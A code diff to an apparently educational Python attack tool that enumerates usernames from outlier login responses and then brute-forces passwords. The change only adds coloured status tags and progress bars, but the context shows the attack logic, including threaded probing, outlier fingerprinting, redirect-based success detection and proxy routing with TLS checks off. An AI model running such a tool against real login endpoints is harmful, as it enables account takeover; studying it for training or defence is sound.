@@ -194,6 +194,14 @@ import urllib3                               # `requests` ships with this - used
 from requests.adapters import HTTPAdapter    # lets us tune the connection pool
 from urllib3.util.retry import Retry         # auto-retry on connection errors / 5xx
 
+# Color + progress helpers (see _common.py). Both gracefully degrade:
+# colors auto-off when stdout isn't a TTY, progress bar is a no-op
+# without tqdm installed.
+from _common import (
+    tag_info, tag_ok, tag_warn, tag_err,
+    progress, bold,
+)
+
 
 # ---------------------------------------------------------------------
 # REGEXES
@@ -536,7 +544,7 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
 
     The Counter-based outlier detection is the heart of the attack.
     """
-    print(f"[*] phase 1: probing {len(usernames)} usernames "
+    print(f"{tag_info()} phase 1: probing {len(usernames)} usernames "
           f"with {cfg.workers} workers"
           + (f" (jitter {cfg.jitter[0]}-{cfg.jitter[1]}s)" if cfg.jitter[1] > 0 else "")
           + (" (CSRF on)" if cfg.use_csrf else "")
@@ -594,7 +602,8 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
         #         on network timing + jitter).
         #   3. fut.result() unwraps the return value of probe()
         #         (or re-raises any exception probe() threw).
-        for fut in as_completed([ex.submit(probe, u) for u in usernames]):
+        futures = [ex.submit(probe, u) for u in usernames]
+        for fut in progress(as_completed(futures), total=len(futures), desc="usernames"):
             u, status, length, msg, body = fut.result()
             results[u] = (status, length, msg)
 
@@ -631,7 +640,7 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
     #   - Wrong URL (404 for every request)
     #   - Server returning a generic error page regardless of input
     if not unique:
-        print("[-] no outlier found - every response looked identical.")
+        print(f"{tag_err()} no outlier found - every response looked identical.")
         for u, fp in list(results.items())[:3]:
             print(f"    sample: {u!r} -> {fp}")
         return None
@@ -644,7 +653,7 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
     # from the body before fingerprinting (or compare by error MESSAGE
     # only, not length).
     if len(unique) > 1:
-        print(f"[!] {len(unique)} outliers - server may be noisy. Candidates:")
+        print(f"{tag_warn()} {len(unique)} outliers - server may be noisy. Candidates:")
         for fp in unique:
             for u, r in results.items():
                 if r == fp:
@@ -660,7 +669,7 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
     # i.e. what "invalid username" responses look like. We print it as
     # the baseline so the user can see what we keyed on.
     baseline = counts.most_common(1)[0][0]
-    print(f"[+] valid username: {valid!r}")
+    print(f"{tag_ok()} valid username: {valid!r}")
     print(f"    outlier  : status={fingerprint[0]} len={fingerprint[1]} msg={fingerprint[2]!r}")
     print(f"    baseline : status={baseline[0]}  len={baseline[1]}  msg={baseline[2]!r}")
     return valid
@@ -677,7 +686,7 @@ def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> st
     Stops as soon as the password is found instead of waiting for
     every probe to finish.
     """
-    print(f"[*] phase 2: trying {len(passwords)} passwords against {username!r}")
+    print(f"{tag_info()} phase 2: trying {len(passwords)} passwords against {username!r}")
     shared = None if cfg.fresh_session else build_session(
         cfg.workers, cfg.proxy, cfg.insecure,
         retries=cfg.retries, extra_headers=cfg.extra_headers,
@@ -695,7 +704,7 @@ def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> st
         # {Future: password} dict so we can iterate to .cancel() later.
         futures = {ex.submit(probe, p): p for p in passwords}
 
-        for fut in as_completed(futures):
+        for fut in progress(as_completed(futures), total=len(futures), desc="passwords"):
             p, status, location = fut.result()
 
             if cfg.verbose:
@@ -706,7 +715,7 @@ def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> st
             # header says).
             if status == 302:
                 found = p
-                print(f"[+] password found: {p!r}  -> redirect to {location!r}")
+                print(f"{tag_ok()} password found: {p!r}  -> redirect to {location!r}")
 
                 # Cancel queued probes so we don't keep hammering
                 # the server after we've won.
@@ -886,7 +895,7 @@ def main():
         # proxy will present its OWN CA, which Python won't trust.
         insecure = True
 
-        print(f"[*] routing through proxy: {proxy} (TLS verification disabled)")
+        print(f"{tag_info()} routing through proxy: {proxy} (TLS verification disabled)")
 
     if insecure:
         # Silence the noisy "InsecureRequestWarning: Unverified HTTPS
@@ -933,7 +942,7 @@ def main():
     # ---- Phase 2: brute-force the password ----
     pw = brute_password(cfg, user, passwords)
     if not pw:
-        print("[-] no password matched.")
+        print(f"{tag_err()} no password matched.")
         sys.exit(1)
 
     # ---- Final output ----
@@ -955,7 +964,7 @@ def main():
         }
         # `indent=2` makes it human-readable; drop it for compact output.
         cfg.output.write_text(json.dumps(summary, indent=2) + "\n")
-        print(f"[*] wrote summary to {cfg.output}")
+        print(f"{tag_info()} wrote summary to {cfg.output}")
 
 
 # Standard Python idiom: only run main() if this file is executed
